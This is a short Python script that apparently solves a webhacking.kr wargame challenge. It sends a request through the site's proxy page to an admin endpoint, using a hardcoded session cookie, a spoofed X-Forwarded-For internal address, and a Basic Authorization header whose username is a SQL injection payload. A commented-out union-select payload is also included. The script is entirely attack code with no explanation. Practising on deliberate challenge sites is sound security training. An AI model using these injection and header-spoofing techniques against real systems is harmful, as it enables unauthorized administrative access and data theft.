import requests
import base64
URL = "http://webhacking.kr:10008/proxy.php?=/http://webhacking.kr:10008/admin/"
SESSION_ID = "173phgqn3p9n7o8j2jv43k0j2n"
cookies = {'PHPSESSID':SESSION_ID}
# username = "none' && 0 union select 'guest' as 'id' -- "
# username = 'guest'
# password = 'guest'
username = "' or id='admin'#"
password = 'bla'
headers = {'Authorization': 'Basic {}\r\n'.format(base64.b64encode((username+':'+password).encode()).decode()),
           'X-Forwarded-For':'172.17.0.17'}
print (headers)
response = requests.post(URL, cookies=cookies, headers=headers)
print(response.text)